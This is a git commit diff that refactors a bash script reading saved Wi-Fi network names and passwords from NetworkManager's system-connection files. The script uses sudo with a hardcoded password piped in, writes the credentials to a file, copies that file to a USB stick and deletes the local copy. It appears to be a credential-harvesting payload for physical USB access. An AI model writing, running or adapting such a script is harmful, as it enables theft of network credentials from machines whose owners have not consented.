4acffd1bd10fd61e8011ba7e0a1c103246a40be5
AleksaMCode <aleksamcode@gmail.com>
2023-05-12 15:34:02 +0200

    Code refactored; for loop wifi passwords location bug removed

--- scripts/wifi_passwords_print.sh
+++ scripts/wifi_passwords_print.sh
@@ -1,2 +1,10 @@
 #!/bin/bash
-echo -e "Wireless_Network_Name Password\n--------------------- --------" > ~/Desktop/wifi_pass.txt ; for FILE in *; do echo -e "$(sudo <<< "pass" cat "$FILE" | grep -oP '(?<=ssid=).*') \t\t\t\t  $(sudo <<< "pass" cat "$FILE" | grep -oP '(?<=psk=).*')"; done >> ~/Desktop/wifi_pass.txt; cp ~/Desktop/wifi_pass.txt /media/$(hostname)/MyUsb/; rm ~/Desktop/wifi_pass.txt
+echo "Wireless_Network_Name Password\n--------------------- --------" > ~/Desktop/wifi_pass.txt
+
+for FILE in /etc/NetworkManager/system-connections/*
+do
+    echo "$(sudo <<< "pass" cat "$FILE" | grep -oP '(?<=ssid=).*') \t\t\t\t  $(sudo <<< "pass" cat "$FILE" | grep -oP '(?<=psk=).*')"
+done >> ~/Desktop/wifi_pass.txt
+
+cp ~/Desktop/wifi_pass.txt /media/$(hostname)/UsbStick/
+rm ~/Desktop/wifi_pass.txt
